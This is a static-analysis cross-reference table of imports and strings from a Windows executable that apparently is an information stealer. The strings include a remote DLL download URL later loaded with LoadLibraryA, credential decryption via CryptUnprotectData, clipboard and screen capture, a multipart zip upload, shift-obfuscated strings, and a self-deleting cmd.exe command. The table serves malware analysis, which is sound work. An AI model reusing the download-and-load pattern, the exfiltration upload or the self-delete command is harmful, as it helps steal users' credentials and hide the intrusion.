reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x407c0a	0x439044	import	0x407750	KERNEL32.dll.CloseHandle
0x407c5f	0x439044	import	0x407750	KERNEL32.dll.CloseHandle
0x407cfd	0x4391f8	import	0x407750	USER32.dll.GetDesktopWindow
0x407d05	0x439080	import	0x407750	KERNEL32.dll.GetTickCount
0x407e67	0x439044	import	0x407750	KERNEL32.dll.CloseHandle
0x407ee6	0x4390b0	import	0x407750	KERNEL32.dll.SetFilePointer
0x4082b6	0x439034	import	0x408200	KERNEL32.dll.CreateFileA
0x408449	0x439064	import	0x4083e0	KERNEL32.dll.UnmapViewOfFile
0x40845e	0x439044	import	0x4083e0	KERNEL32.dll.CloseHandle
0x408479	0x439044	import	0x4083e0	KERNEL32.dll.CloseHandle
0x4087f1	0x4458ac	string	0x408790	HXU]YKX
0x408c81	0x4458b4	string	0x408790	YZKGS
0x40917d	0x4458bc	string	0x408790	JKYQZUV
0x4094ba	0x4458c4	string	0x408790	LORKY
0x4098de	0x4391f4	import	0x4098a0	USER32.dll.keybd_event
0x4098f4	0x439024	import	0x4098a0	KERNEL32.dll.Sleep
0x4098fc	0x4391f0	import	0x4098a0	USER32.dll.OpenClipboard
0x409904	0x439200	import	0x4098a0	USER32.dll.GetClipboardData
0x40990c	0x4391e8	import	0x4098a0	USER32.dll.CloseClipboard
0x409947	0x43924c	import	0x4098a0	ole32.dll.CreateStreamOnHGlobal
0x40998b	0x4390bc	import	0x4098a0	KERNEL32.dll.EnterCriticalSection
0x409995	0x4390b8	import	0x4098a0	KERNEL32.dll.LeaveCriticalSection
0x4099ac	0x439018	import	0x4098a0	GDI32.dll.GetObjectA
0x409a67	0x4391dc	import	0x4098a0	SHLWAPI.dll.IStream_Size
0x409a76	0x4391e0	import	0x4098a0	SHLWAPI.dll.IStream_Reset
0x409aa7	0x4391d8	import	0x4098a0	SHLWAPI.dll.IStream_Read
0x409b9b	0x4458cc	string	0x4098a0	JKYQZUV
0x409e93	0x439004	import	0x409e20	ADVAPI32.dll.RegOpenKeyExA
0x409eb3	0x439000	import	0x409e20	ADVAPI32.dll.RegGetValueA
0x40a00e	0x4458dc	string	0x409fc0	9ZKGS6GZN
0x40a043	0x4458e8	string	0x409fc0	95,:='8+BB<GR\KBB9ZKGS
0x40a1c2	0x418814	string	0x409fc0	j\fh؋D blocks=Basic Latin,Arabic
0x40a1d6	0x4458b4	string	0x409fc0	YZKGS
0x40a2cb	0x445910	string	0x409fc0	.vdf
0x40a3bd	0x445918	string	0x409fc0	9ZKGS
0x40a705	0x418814	string	0x409fc0	j\fh؋D blocks=Basic Latin,Arabic
0x40a71c	0x4458b4	string	0x409fc0	YZKGS
0x40a875	0x445928	string	0x409fc0	9ZKGS
0x40b2d0	0x40b38c	string	0x40ac80	j\vhpYD
0x40b2d8	0x44594c	string	0x40ac80	:KRKMXGS
0x40b413	0x44597c	string	0x40ac80	:KRKMXGS
0x40bbec	0x418814	string	0x40b760	j\fh؋D blocks=Basic Latin,Arabic
0x40bc00	0x4458bc	string	0x40b760	JKYQZUV
0x40bd34	0x4459b4	string	0x40bcc0	8UGSOTM
0x40be9a	0x4459bc	string	0x40bcc0	=GRRKZ
0x40c148	0x43900c	import	0x40c0f0	CRYPT32.dll.CryptUnprotectData
0x40c1cb	0x439060	import	0x40c0f0	KERNEL32.dll.LocalFree
0x40c497	0x4459c8	string	0x40c2a0	http://data-collector.online/sqlite3/sqlite3.dll
0x40c49e	0x439254	import	0x40c2a0	urlmon.dll.URLDownloadToFileA
0x40c597	0x43903c	import	0x40c2a0	KERNEL32.dll.LoadLibraryA
0x40c5b1	0x4459fc	string	0x40c2a0	YWROZK
0x40c5e2	0x43905c	import	0x40c2a0	KERNEL32.dll.GetProcAddress
0x40c637	0x445a0c	string	0x40c2a0	YWROZK
0x40c6b7	0x445a20	string	0x40c2a0	YWROZK
0x40c737	0x445a30	string	0x40c2a0	YWROZK
0x40c7b7	0x445a44	string	0x40c2a0	YWROZK
0x40c837	0x445a5c	string	0x40c2a0	YWROZK
0x40c8b7	0x445a70	string	0x40c2a0	YWROZK
0x40c970	0x445a80	string	0x40c2a0	VGYY
0x40ca85	0x445a88	string	0x40c2a0	9+2+):
0x40ccf6	0x445ac8	string	0x40c2a0	.59:
0x40cdad	0x445ad0	string	0x40c2a0	25-/4
0x40ce6e	0x445ad8	string	0x40c2a0	6'99=58*
0x40cf16	0x445ae4	string	0x40c2a0	---------------------------------------
0x40d0c7	0x445b0c	string	0x40c2a0	cook
0x40d10a	0x445b18	string	0x40c2a0	9+2+):
0x40d44a	0x445b70	string	0x40c2a0	FALSE
0x40d795	0x445b78	string	0x40c2a0	afill
0x40d7ef	0x445b80	string	0x40c2a0	9+2+):
0x40d9f8	0x445ba4	string	0x40c2a0	4'3+
0x40daaf	0x445bac	string	0x40c2a0	<'2;+
0x40db54	0x445ae4	string	0x40c2a0	---------------------------------------
0x40ddf4	0x4390c4	import	0x40ddb0	KERNEL32.dll.GetModuleFileNameA
0x40de36	0x439084	import	0x40ddb0	KERNEL32.dll.GetComputerNameA
0x40e061	0x445bf0	string	0x40ddb0	2G[TIN
0x40e16f	0x445c00	string	0x40ddb0	9ZGXZ[V
0x40e212	0x445c10	string	0x40ddb0	;YKX4GSK
0x40e368	0x445c1c	string	0x40ddb0	OTLUXSGZOUT
0x40e601	0x4390c4	import	0x40e5b0	KERNEL32.dll.GetModuleFileNameA
0x40e60e	0x445c2c	string	0x40e5b0	cmd.exe /C ping 1.1.1.1 -n 1 -w 1000 > Nul & Del /f /q "%s"
0x40e64d	0x43907c	import	0x40e5b0	KERNEL32.dll.CreateProcessA
0x40e659	0x439044	import	0x40e5b0	KERNEL32.dll.CloseHandle
0x40e665	0x439044	import	0x40e5b0	KERNEL32.dll.CloseHandle
0x40e724	0x445cac	string	0x40e680	\fVI#
0x40e76f	0x445cb4	string	0x40e680	\fII#
0x40e7e3	0x445cbc	string	0x40e680	%OJ#
0x40eded	0x40ee1e	string	0x40e680	jjjj
0x40ee2d	0x445cc4	string	0x40e680	[VRUGJKX
0x40ee5f	0x43920c	import	0x40e680	WININET.dll.InternetOpenA
0x40eed5	0x439210	import	0x40e680	WININET.dll.InternetConnectA
0x40eefb	0x445cd0	string	0x40e680	659:
0x40ef3c	0x439220	import	0x40e680	WININET.dll.HttpOpenRequestA
0x40f25d	0x445cd8	string	0x40e680	--SendFileZIPBoundary\r\n
0x40f282	0x445cf0	string	0x40e680	Content-Disposition: form-data; name="fileToUpload"; filename="zipfile.zip"\r\n
0x40f2c9	0x445d40	string	0x40e680	Content-Type: application/zip\r\n\r\n
0x40f310	0x445d64	string	0x40e680	\r\n\r\n--SendFileZIPBoundary--\r\n
0x40f393	0x445c68	string	0x40e680	Content-Type: multipart/form-data; boundary=SendFileZIPBoundary\r\n
0x40f42f	0x439214	import	0x40e680	WININET.dll.HttpSendRequestExA
0x40f43a	0x43921c	import	0x40e680	WININET.dll.InternetWriteFile
0x40f487	0x439218	import	0x40e680	WININET.dll.HttpEndRequestA
0x40f4c2	0x439208	import	0x40e680	WININET.dll.InternetCloseHandle
0x40f6b5	0x40f6ca	string	0x40f620	j\bV訔 blocks=Basic Latin,CJK Unified Ideographs
0x40f6be	0x40f6ca	string	0x40f620	j\bV訔 blocks=Basic Latin,CJK Unified Ideographs
0x40f7b5	0x40f7ca	string	0x40f720	j\bV訓 blocks=Basic Latin,CJK Unified Ideographs
0x40f7be	0x40f7ca	string	0x40f720	j\bV訓 blocks=Basic Latin,CJK Unified Ideographs
0x40f852	0x445d84	string	0x40f820	ConsoleWindowClass
0x40f857	0x4391ec	import	0x40f820	USER32.dll.FindWindowA
0x40f85e	0x4391fc	import	0x40f820	USER32.dll.ShowWindow
0x40f864	0x4391d0	import	0x40f820	SHELL32.dll.SHGetFolderPathA
0x40f89c	0x445d98	string	0x40f820	BB;YKXYBB6[HROIBB
0x40fa4d	0x445db0	string	0x40f820	2UMOT
0x40fa8a	0x445dbc	string	0x40f820	)UUQOKY
0x40fb04	0x445dd0	string	0x40f820	]GRRKZ
0x40fb75	0x418814	string	0x40f820	j\fh؋D blocks=Basic Latin,Arabic
0x40fb8a	0x4458ac	string	0x40f820	HXU]YKX
0x40fbc9	0x4458ac	string	0x40f820	HXU]YKX
0x40fc09	0x445ddc	string	0x40f820	.rar
0x40fc6c	0x445de4	string	0x40f820	{1} {1}
0x40fcbc	0x445dec	string	0x40f820	{7} {1}
0x40fcd8	0x445df4	string	0x40f820	{6} {1}
0x40fcf4	0x445dfc	string	0x40f820	{2} {1}
0x40fd60	0x445e08	string	0x40f820	{3} {1}
0x40fd6c	0x43902c	import	0x40f820	KERNEL32.dll.CopyFileA
0x40fd7f	0x445db0	string	0x40f820	2UMOT
0x40fe8b	0x445e10	string	0x40f820	pass
0x40fee5	0x445e18	string	0x40f820	HXU]YKXY
0x40ff40	0x445e30	string	0x40f820	{8} {1}
0x40ff5a	0x445dd0	string	0x40f820	]GRRKZ
0x40ffa5	0x445e38	string	0x40f820	{5} {1}
0x410131	0x445b78	string	0x40f820	afill
0x41018b	0x445e44	string	0x40f820	HXU]YKXY
0x4101e6	0x445e5c	string	0x40f820	{4} {1}
0x410266	0x445dbc	string	0x40f820	)UUQOKY
0x41037a	0x445b0c	string	0x40f820	cook
0x4103d4	0x445e68	string	0x40f820	HXU]YKXY
0x410433	0x439078	import	0x40f820	KERNEL32.dll.FreeLibrary
0x4104ac	0x445e90	string	0x40f820	JGZG
0x41053b	0x445ea8	string	0x40f820	{9} {1}
0x410550	0x43904c	import	0x40f820	KERNEL32.dll.FreeConsole
0x410558	0x43906c	import	0x40f820	KERNEL32.dll.ExitProcess
0x410bab	0x410bb4	string	0x410aa0	3\tL$\f
0x4131e5	0x41327f	string	0x413130	SQVQ
0x413820	0x445eb0	string	0x413820	invalid string position
0x415b20	0x445ec8	string	0x415b20	vector<T> too long
0x415b40	0x445edc	string	0x415b40	string too long
0x416a8e	0x416a80	string	0x416940	;F\bu'
0x416bb1	0x43915c	import	0x416ba1	KERNEL32.dll.GetModuleHandleW
0x416bbf	0x43905c	import	0x416ba1	KERNEL32.dll.GetProcAddress
0x416bdb	0x439158	import	0x416ba1	KERNEL32.dll.SetLastError
0x416bf2	0x439044	import	0x416be6	KERNEL32.dll.CloseHandle
0x416c17	0x439154	import	0x416c06	KERNEL32.dll.AreFileApisANSI
0x416c38	0x439160	import	0x416c23	KERNEL32.dll.MultiByteToWideChar
0x416c44	0x439030	import	0x416c23	KERNEL32.dll.GetLastError
0x416c8d	0x439164	import	0x416c57	KERNEL32.dll.WideCharToMultiByte
0x416cb9	0x439164	import	0x416c57	KERNEL32.dll.WideCharToMultiByte
0x416cc5	0x439030	import	0x416c57	KERNEL32.dll.GetLastError
0x416ce9	0x439164	import	0x416c57	KERNEL32.dll.WideCharToMultiByte
0x416cf5	0x439030	import	0x416c57	KERNEL32.dll.GetLastError
0x416d13	0x439144	import	0x416d0a	KERNEL32.dll.FindNextFileW
0x416d21	0x439030	import	0x416d0a	KERNEL32.dll.GetLastError
0x416d37	0x43913c	import	0x416d2b	KERNEL32.dll.FindClose
0x416d67	0x439140	import	0x416d4b	KERNEL32.dll.FindFirstFileExW
0x416d74	0x439030	import	0x416d4b	KERNEL32.dll.GetLastError
0x416d8e	0x439140	import	0x416d4b	KERNEL32.dll.FindFirstFileExW
0x416d9b	0x439030	import	0x416d4b	KERNEL32.dll.GetLastError
0x416e66	0x439148	import	0x416dab	KERNEL32.dll.GetFileAttributesExW
0x416e70	0x439030	import	0x416dab	KERNEL32.dll.GetLastError
0x416efe	0x439320	string	0x416dab	GetFileInformationByHandleEx
0x416f03	0x439304	string	0x416dab	kernel32.dll
0x416f4e	0x439030	import	0x416dab	KERNEL32.dll.GetLastError
0x41702a	0x439028	import	0x416dab	KERNEL32.dll.GetFileInformationByHandle
0x41708d	0x439140	import	0x416dab	KERNEL32.dll.FindFirstFileExW
0x41709d	0x43913c	import	0x416dab	KERNEL32.dll.FindClose
0x417104	0x439134	import	0x4170ef	KERNEL32.dll.CreateFileW
0x417114	0x439030	import	0x4170ef	KERNEL32.dll.GetLastError
0x4171e9	0x4393dc	string	0x4171df	bad allocation
0x4176f8	0x439910	string	0x4176e6	address family not supported
0x4176ff	0x445520	string	0x4176e6	unknown error
0x41775d	0x439168	import	0x41772d	KERNEL32.dll.FormatMessageW
0x41779c	0x439164	import	0x41772d	KERNEL32.dll.WideCharToMultiByte
0x417bd2	0x439068	import	0x417bcc	KERNEL32.dll.DeleteCriticalSection
0x417bf7	0x4390bc	import	0x417bf1	KERNEL32.dll.EnterCriticalSection
0x417c05	0x4390b8	import	0x417bff	KERNEL32.dll.LeaveCriticalSection
0x417c0e	0x439304	string	0x417bff	kernel32.dll
0x417c13	0x43915c	import	0x417bff	KERNEL32.dll.GetModuleHandleW
0x417c1b	0x439fe8	string	0x417bff	FlsAlloc
0x417c21	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417c27	0x439ff4	string	0x417bff	FlsFree
0x417c32	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417c38	0x439ffc	string	0x417bff	FlsGetValue
0x417c43	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417c49	0x43a008	string	0x417bff	FlsSetValue
0x417c54	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417c5a	0x43a014	string	0x417bff	InitializeCriticalSectionEx
0x417c65	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417c6b	0x43a030	string	0x417bff	InitOnceExecuteOnce
0x417c76	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417c7c	0x43a044	string	0x417bff	CreateEventExW
0x417c87	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417c8d	0x43a054	string	0x417bff	CreateSemaphoreW
0x417c98	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417c9e	0x43a068	string	0x417bff	CreateSemaphoreExW
0x417ca9	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417caf	0x43a07c	string	0x417bff	CreateThreadpoolTimer
0x417cba	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417cc0	0x43a094	string	0x417bff	SetThreadpoolTimer
0x417ccb	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417cd1	0x43a0a8	string	0x417bff	WaitForThreadpoolTimerCallbacks
0x417cdc	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417ce2	0x43a0c8	string	0x417bff	CloseThreadpoolTimer
0x417ced	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417cf3	0x43a0e0	string	0x417bff	CreateThreadpoolWait
0x417cfe	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417d04	0x43a0f8	string	0x417bff	SetThreadpoolWait
0x417d0f	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417d15	0x43a10c	string	0x417bff	CloseThreadpoolWait
0x417d20	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417d26	0x43a120	string	0x417bff	FlushProcessWriteBuffers
0x417d31	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417d37	0x43a13c	string	0x417bff	FreeLibraryWhenCallbackReturns
0x417d42	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417d48	0x43a15c	string	0x417bff	GetCurrentProcessorNumber
0x417d53	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417d5e	0x4392f0	string	0x417bff	CreateSymbolicLinkW
0x417d64	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417d6a	0x43a178	string	0x417bff	GetCurrentPackageId
0x417d75	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417d7b	0x43a18c	string	0x417bff	GetTickCount64
0x417d86	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417d8c	0x439320	string	0x417bff	GetFileInformationByHandleEx
0x417d97	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417d9d	0x439340	string	0x417bff	SetFileInformationByHandle
0x417da8	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417dae	0x43a19c	string	0x417bff	GetSystemTimePreciseAsFileTime
0x417db9	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417dbf	0x43a1bc	string	0x417bff	InitializeConditionVariable
0x417dca	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417dd0	0x43a1d8	string	0x417bff	WakeConditionVariable
0x417ddb	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417de1	0x43a1f0	string	0x417bff	WakeAllConditionVariable
0x417dec	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417df2	0x43a20c	string	0x417bff	SleepConditionVariableCS
0x417dfd	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417e03	0x43a228	string	0x417bff	InitializeSRWLock
0x417e0e	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417e14	0x43a23c	string	0x417bff	AcquireSRWLockExclusive
0x417e1f	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417e25	0x43a254	string	0x417bff	TryAcquireSRWLockExclusive
0x417e30	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417e36	0x43a270	string	0x417bff	ReleaseSRWLockExclusive
0x417e41	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417e47	0x43a288	string	0x417bff	SleepConditionVariableSRW
0x417e52	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417e58	0x43a2a4	string	0x417bff	CreateThreadpoolWork
0x417e63	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417e69	0x43a2bc	string	0x417bff	SubmitThreadpoolWork
0x417e74	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417e7a	0x43a2d4	string	0x417bff	CloseThreadpoolWork
0x417e85	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417e8b	0x43a2e8	string	0x417bff	CompareStringEx
0x417e96	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417e9c	0x43a2f8	string	0x417bff	GetLocaleInfoEx
0x417ea7	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417ead	0x43a308	string	0x417bff	LCMapStringEx
0x417eb8	0x43905c	import	0x417bff	KERNEL32.dll.GetProcAddress
0x417f0a	0x439174	import	0x417ec7	KERNEL32.dll.SwitchToThread
0x417f7a	0x43916c	import	0x417f51	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x417fba	0x439058	import	0x417f86	KERNEL32.dll.DecodePointer
0x417ffe	0x43918c	import	0x417feb	KERNEL32.dll.EncodePointer
0x418063	0x439160	import	0x41801a	KERNEL32.dll.MultiByteToWideChar
0x4180da	0x439160	import	0x41801a	KERNEL32.dll.MultiByteToWideChar
0x4181aa	0x439164	import	0x41801a	KERNEL32.dll.WideCharToMultiByte
0x41824d	0x418256	string	0x41820d	_^[]
0x4182cf	0x439194	import	0x418285	KERNEL32.dll.LCMapStringW
0x418373	0x4391a4	import	0x418340	KERNEL32.dll.IsDebuggerPresent
0x41837d	0x43c4e0	string	0x418340	ERROR : Unable to initialize critical section in CAtlBaseModule\n
0x418382	0x4391a8	import	0x418340	KERNEL32.dll.OutputDebugStringW
0x4183bd	0x439068	import	0x418393	KERNEL32.dll.DeleteCriticalSection
0x418437	0x43916c	import	0x41842b	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x41843d	0x43c578	string	0x41842b	api-ms-win-core-synch-l1-2-0.dll
0x418442	0x43915c	import	0x41842b	KERNEL32.dll.GetModuleHandleW
0x41844e	0x439304	string	0x41842b	kernel32.dll
0x418453	0x43915c	import	0x41842b	KERNEL32.dll.GetModuleHandleW
0x41845f	0x43a20c	string	0x41842b	SleepConditionVariableCS
0x418465	0x43905c	import	0x41842b	KERNEL32.dll.GetProcAddress
0x41846b	0x43a1f0	string	0x41842b	WakeAllConditionVariable
0x418473	0x43905c	import	0x41842b	KERNEL32.dll.GetProcAddress
0x418496	0x439170	import	0x41842b	KERNEL32.dll.CreateEventW
0x4184b2	0x439068	import	0x41842b	KERNEL32.dll.DeleteCriticalSection
0x4184c2	0x439044	import	0x41842b	KERNEL32.dll.CloseHandle
0x4184d3	0x4390bc	import	0x4184c9	KERNEL32.dll.EnterCriticalSection
0x418506	0x4390b8	import	0x4184c9	KERNEL32.dll.LeaveCriticalSection
0x41851e	0x4390bc	import	0x418513	KERNEL32.dll.EnterCriticalSection
0x41855b	0x4390b8	import	0x418513	KERNEL32.dll.LeaveCriticalSection
0x418587	0x4391ac	import	0x418513	KERNEL32.dll.SetEvent
0x418593	0x4391b0	import	0x418513	KERNEL32.dll.ResetEvent
0x4185c8	0x4390b8	import	0x41859b	KERNEL32.dll.LeaveCriticalSection
0x4185d9	0x4391b4	import	0x41859b	KERNEL32.dll.WaitForSingleObjectEx
0x4185e0	0x4390bc	import	0x41859b	KERNEL32.dll.EnterCriticalSection
0x4185ee	0x4391bc	import	0x4185e9	KERNEL32.dll.SetUnhandledExceptionFilter
0x4185f7	0x4391b8	import	0x4185e9	KERNEL32.dll.UnhandledExceptionFilter
0x418602	0x4391c0	import	0x4185e9	KERNEL32.dll.GetCurrentProcess
0x418609	0x4391c4	import	0x4185e9	KERNEL32.dll.TerminateProcess
0x41907f	0x4391a4	import	0x418fa8	KERNEL32.dll.IsDebuggerPresent
0x41909f	0x4391bc	import	0x418fa8	KERNEL32.dll.SetUnhandledExceptionFilter
0x4190a9	0x4391b8	import	0x418fa8	KERNEL32.dll.UnhandledExceptionFilter
0x4190c9	0x43915c	import	0x4190c7	KERNEL32.dll.GetModuleHandleW
0x41910f	0x4391bc	import	0x41910a	KERNEL32.dll.SetUnhandledExceptionFilter
0x41932b	0x4193b4	string	0x4191fb	_^[3
0x419349	0x4193b4	string	0x4191fb	_^[3
0x419351	0x4193b4	string	0x4191fb	_^[3
0x41936b	0x4193b4	string	0x4191fb	_^[3
0x419387	0x4193b4	string	0x4191fb	_^[3
0x4193a4	0x4193b4	string	0x4191fb	_^[3
0x4193dd	0x439188	import	0x4193cb	KERNEL32.dll.GetSystemTimeAsFileTime
0x4193ec	0x439118	import	0x4193cb	KERNEL32.dll.GetCurrentThreadId
0x4193f5	0x43911c	import	0x4193cb	KERNEL32.dll.GetCurrentProcessId
